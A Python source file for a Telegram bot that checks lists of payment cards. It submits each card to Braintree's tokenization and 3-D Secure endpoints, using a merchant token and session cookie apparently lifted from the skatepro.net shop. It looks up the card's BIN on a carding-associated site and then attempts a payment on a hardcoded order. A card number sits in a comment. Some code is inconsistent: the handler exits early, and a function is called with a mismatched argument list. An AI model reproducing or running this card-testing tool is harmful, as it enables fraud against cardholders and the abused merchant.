import requests
from pyrogram import Client, filters
from pyrogram.types import Message
import random
#from helpers.timemanager import run_sync_in_thread, rate_limiter

# Disable urllib3 warnings
requests.packages.urllib3.disable_warnings()


@Client.on_message(filters.command('chk'))
async def check_card(bot: Client, cmd: Message):
    return await cmd.reply_text('We are currently working on this feature. Please try again later.')
    status = await cmd.reply_text("<b>⎚ `Processing ...`</b>")

    if cmd.reply_to_message and cmd.reply_to_message.document and cmd.reply_to_message.document.mime_type == 'text/plain':
        try:
            cards_path = await cmd.reply_to_message.download()
            with open(cards_path, 'r+', encoding='utf-8') as f:
                for line in f:
                    c = line.strip()
                    cc, exp, ex, cvc = c.split(
                        '|')[:4]  # Split once and unpack
                    try:
                        exy = ex[2] + ex[3] if len(ex) >= 4 else ex[0] + ex[1]
                        if '2' in exy[1] or '1' in exy[1]:
                            exy = exy[0] + '7'
                    except IndexError:
                        exy = ex[0:2]
                        if '2' in exy[1] or '1' in exy[1]:
                            exy = exy[0] + '7'

                    await check_vbv(cc.strip(), exp.strip(), exy, cvc.strip(), status)
        except Exception as e:
            print(f"Error processing file: {e}")
    elif cmd.text:
        try:
            data = cmd.text.split("/chk", 1)[1].strip().split('|')
            cc = data[0].strip()
            exp = data[1].strip()
            ex = data[2].strip()
            cvc = data[3].strip()

            try:
                exy = ex[2:4]
                if '2' in exy or '1' in exy:
                    exy = ex[2] + '7'
            except IndexError:
                exy = ex[0:2]
                if '2' in exy or '1' in exy:
                    exy = ex[0] + '7'

        except IndexError:
            return await status.edit_text("<b>⎚ Use <code>/vbv </code> Checks VBV Card</b>")
        else:
            await check_vbv(cc, exp, exy, cvc, status)
    else:
        await status.edit_text("<b>⎚ Use <code>/vbv </code> Checks VBV Card</b>")


#@run_sync_in_thread
def check_vbv(cc, exp, exy, cvc):
    url = "https://payments.braintree-api.com/graphql"

    payload = {
        "clientSdkMetadata": {
            "integration": "custom",
            "sessionId": "f23ef8b3-b588-4063-9ca0-7c5cbb39623b",
            "source": "client"
        },
        "operationName": "TokenizeCreditCard",
        "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
        "variables": {
            "input": {
                "creditCard": {
                    "cvv": f"{cvc}",
                    "expirationMonth": f"{exp}",
                    "expirationYear": f"{exy}",
                    "number": f"{cc}"
                },
                "options": {
                    "validate": False
                }
            }
        }
    }

    headers = {
        'Host': 'payments.braintree-api.com',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'application/json',
        'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjEyNzM3OTcsImp0aSI6ImNhYTk5ZDQ0LWJmNTQtNDlkYi05MmZiLWMzNWYxNjc3YzUyMyIsInN1YiI6IjR4dnhtNHc2cnZ4Nm5xbjQiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjR4dnhtNHc2cnZ4Nm5xbjQiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6InNrYXRlcHJvRVVSIn19.R5zeigjSOnnSKj-5SLdRkhxTJQ21KsFWKgxrGtNEJPlCdOlp2sEa7DIQCVnTwqL8sm52AAH5fQiiMoXbxF1vlQ',
        'Braintree-Version': '2018-05-10',
        'Origin': 'https://assets.braintreegateway.com',
        'Connection': 'keep-alive',
        'Referer': 'https://assets.braintreegateway.com/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'cross-site',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Length': '754'
    }

    
    response = requests.post(
        url, json=payload, headers=headers, verify=False)
    response.raise_for_status()

    if "token" in response.text:
        tok = response.json()["data"]["tokenizeCreditCard"]["token"]
        bin = response.json()[
            "data"]["tokenizeCreditCard"]["creditCard"]["bin"]

        lookup_url = f"https://api.braintreegateway.com/merchants/4xvxm4w6rvx6nqn4/client_api/v1/payment_methods/{tok}/three_d_secure/lookup"

        lookup_payload = {
            "amount": "10.9",
            "additionalInfo": {
                "workPhoneNumber": "",
                "shippingGivenName": "Jack",
                "shippingSurname": "Smith",
                "shippingPhone": "",
                "billingLine1": "24 Avenue Emile Reuter, L-2420",
                "billingLine2": "",
                "billingCity": "josan",
                "billingState": "",
                "billingPostalCode": "L-2420",
                "billingCountryCode": "LU",
                "billingPhoneNumber": "274448280",
                "billingGivenName": "Jack",
                "billingSurname": "Smith",
                "shippingLine1": "14th street",
                "shippingLine2": "",
                "shippingCity": "Luxembourg",
                "shippingState": "",
                "shippingPostalCode": "L-2420",
                "shippingCountryCode": "LU",
                "email": "jack@gmail.com"
            },
            "challengeRequested": True,
            "bin": f"{bin}",
            "dfReferenceId": "0_db13bca5-0be3-446f-ade3-f5f397259e62",
            "clientMetadata": {
                "requestedThreeDSecureVersion": "2",
                "sdkVersion": "web/3.82.0",
                "cardinalDeviceDataCollectionTimeElapsed": 1420,
                "issuerDeviceDataCollectionTimeElapsed": 11313,
                "issuerDeviceDataCollectionResult": False
            },
            "authorizationFingerprint": "eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjEyNzM3OTcsImp0aSI6ImNhYTk5ZDQ0LWJmNTQtNDlkYi05MmZiLWMzNWYxNjc3YzUyMyIsInN1YiI6IjR4dnhtNHc2cnZ4Nm5xbjQiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjR4dnhtNHc2cnZ4Nm5xbjQiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6InNrYXRlcHJvRVVSIn19.R5zeigjSOnnSKj-5SLdRkhxTJQ21KsFWKgxrGtNEJPlCdOlp2sEa7DIQCVnTwqL8sm52AAH5fQiiMoXbxF1vlQ",
            "braintreeLibraryVersion": "braintree/web/3.82.0",
            "_meta": {
                "merchantAppId": "www.skatepro.net",
                "platform": "web",
                "sdkVersion": "3.82.0",
                "source": "client",
                "integration": "custom",
                "integrationType": "custom",
                "sessionId": "f23ef8b3-b588-4063-9ca0-7c5cbb39623b"
            }
        }

        headers = {
            'Host': 'api.braintreegateway.com',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Content-Type': 'application/json',
            'Origin': 'https://www.skatepro.net',
            'Connection': 'keep-alive',
            'Referer': 'https://www.skatepro.net/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'cross-site',
            'Accept-Encoding': 'gzip, deflate',
            'Content-Length': '1756'
        }

        response = requests.post(
            lookup_url, json=lookup_payload, headers=headers, verify=False)
        print(response.text)
        response.raise_for_status()

        # Fetch BIN information
        req = requests.get(
            f"https://bins.antipublic.cc/bins/{bin}", verify=False)

        try:
            data = response.json()
            requ = req.json()
        except Exception as e:
            print(f'Something went wrong: {e}')
        else:
            brand = requ['brand']
            country = requ['country']
            country_name = requ['country_name']
            country_flag = requ['country_flag']
            country_currencies = requ['country_currencies']
            bank = requ['bank']
            level = requ['level']
            typea = requ['type']
            status = data['paymentMethod']['threeDSecureInfo']['status']

            # Construct and send the message based on status
            if status == 'authenticate_attempt_successful':
                type = data['paymentMethod']['type']
                nonce = data['paymentMethod']['nonce']
                prepaid = data['paymentMethod']['binData']['prepaid']
                healthcare = data['paymentMethod']['binData']['healthcare']
                debit = data['paymentMethod']['binData']['debit']
                durbinRegulated = data['paymentMethod']['binData']['durbinRegulated']
                commercial = data['paymentMethod']['binData']['commercial']
                payroll = data['paymentMethod']['binData']['payroll']
                issuingBank = data['paymentMethod']['binData']['issuingBank']
                countryOfIssuance = data['paymentMethod']['binData']['countryOfIssuance']
                productId = data['paymentMethod']['binData']['productId']
                bin = data['paymentMethod']['details']['bin']
                lastTwo = data['paymentMethod']['details']['lastTwo']
                lastFour = data['paymentMethod']['details']['lastFour']
                cardType = data['paymentMethod']['details']['cardType']
                expirationYear = data['paymentMethod']['details']['expirationYear']
                expirationMonth = data['paymentMethod']['details']['expirationMonth']
                description = data['paymentMethod']['description']
                enrolled = data['paymentMethod']['threeDSecureInfo']['enrolled']
                cavv = data['paymentMethod']['threeDSecureInfo']['cavv']
                acsTransactionId = data['paymentMethod']['threeDSecureInfo']['acsTransactionId']
                dsTransactionId = data['paymentMethod']['threeDSecureInfo']['dsTransactionId']
                eciFlag = data['paymentMethod']['threeDSecureInfo']['eciFlag']
                paresStatus = data['paymentMethod']['threeDSecureInfo']['paresStatus']
                threeDSecureAuthenticationId = data['paymentMethod']['threeDSecureInfo']['threeDSecureAuthenticationId']
                threeDSecureServerTransactionId = data['paymentMethod']['threeDSecureInfo']['threeDSecureServerTransactionId']
                transStatus = data['paymentMethod']['threeDSecureInfo']['lookup']['transStatus']
                
                headers1 = {
'Host': 'www.skatepro.net',
'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0',
'Accept': 'application/json, text/javascript, */*; q=0.01',
'Accept-Language': 'en-US,en;q=0.5',
'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
'X-Requested-With': 'XMLHttpRequest',
'Origin': 'https://www.skatepro.net',
'Connection': 'keep-alive',
'Referer': 'https://www.skatepro.net/catalog/braintree_form.php?order_id=5556430',
'Cookie': 'osCsid=ea28ed2438a182679474784988aacbc1; cookie_id=1003697466%3A634a1d1da36c',
'Sec-Fetch-Dest': 'empty',
'Sec-Fetch-Mode': 'cors',
'Sec-Fetch-Site': 'same-origin',
'Accept-Encoding': 'gzip, deflate',
'Content-Length': '2302'
}
                url_check = 'https://www.skatepro.net/catalog/ajax/braintree.php?action=make_payment'

                payload1 =f"order_id=5556430&payload%5Bnonce%5D={nonce}&payload%5Btype%5D={type}&payload%5BbinData%5D%5Bprepaid%5D={prepaid}&payload%5BbinData%5D%5Bhealthcare%5D={healthcare}&payload%5BbinData%5D%5Bdebit%5D={debit}&payload%5BbinData%5D%5BdurbinRegulated%5D={durbinRegulated}&payload%5BbinData%5D%5Bcommercial%5D={commercial}&payload%5BbinData%5D%5Bpayroll%5D={payroll}&payload%5BbinData%5D%5BissuingBank%5D={issuingBank}&payload%5BbinData%5D%5BcountryOfIssuance%5D={countryOfIssuance}&payload%5BbinData%5D%5BproductId%5D={productId}&payload%5Bdetails%5D%5Bbin%5D={bin}&payload%5Bdetails%5D%5BlastTwo%5D={lastTwo}&payload%5Bdetails%5D%5BlastFour%5D={lastFour}&payload%5Bdetails%5D%5BcardType%5D={cardType}&payload%5Bdetails%5D%5BcardholderName%5D=&payload%5Bdetails%5D%5BexpirationYear%5D={expirationYear}&payload%5Bdetails%5D%5BexpirationMonth%5D={expirationMonth}&payload%5Bdescription%5D=ending+in+{lastTwo}&payload%5BliabilityShifted%5D=true&payload%5BliabilityShiftPossible%5D=true&payload%5BthreeDSecureInfo%5D%5BliabilityShifted%5D=true&payload%5BthreeDSecureInfo%5D%5BliabilityShiftPossible%5D=true&payload%5BthreeDSecureInfo%5D%5Bstatus%5D=authenticate_attempt_successful&payload%5BthreeDSecureInfo%5D%5Benrolled%5D={enrolled}&payload%5BthreeDSecureInfo%5D%5Bcavv%5D={cavv}&payload%5BthreeDSecureInfo%5D%5Bxid%5D=&payload%5BthreeDSecureInfo%5D%5BacsTransactionId%5D={acsTransactionId}&payload%5BthreeDSecureInfo%5D%5BdsTransactionId%5D={dsTransactionId}&payload%5BthreeDSecureInfo%5D%5BeciFlag%5D={eciFlag}&payload%5BthreeDSecureInfo%5D%5BacsUrl%5D=&payload%5BthreeDSecureInfo%5D%5BparesStatus%5D={paresStatus}&payload%5BthreeDSecureInfo%5D%5BthreeDSecureAuthenticationId%5D={threeDSecureAuthenticationId}&payload%5BthreeDSecureInfo%5D%5BthreeDSecureServerTransactionId%5D={threeDSecureServerTransactionId}&payload%5BthreeDSecureInfo%5D%5BthreeDSecureVersion%5D=2.2.0&payload%5BthreeDSecureInfo%5D%5Blookup%5D%5BtransStatus%5D={transStatus}&payload%5BthreeDSecureInfo%5D%5Blookup%5D%5BtransStatusReason%5D=&payload%5BthreeDSecureInfo%5D%5Bauthentication%5D%5BtransStatus%5D=A&payload%5BthreeDSecureInfo%5D%5Bauthentication%5D%5BtransStatusReason%5D=&payload%5BverificationDetails%5D%5BliabilityShifted%5D=true&payload%5BverificationDetails%5D%5BliabilityShiftPossible%5D=true&data=%7B%22correlation_id%22%3A%22b22803a15194f6780470fd9934d18ca6%22%7D&threedrequired=false"

                print(payload1)

                respu = requests.post(url=url_check, data=payload1, headers=headers1, verify=False)
                print(respu.text)
                print(respu.status_code)

                
            else:
                pass
                    
#check_vbv(cc='4960780014428236', exp='07', exy='27', cvc='672')


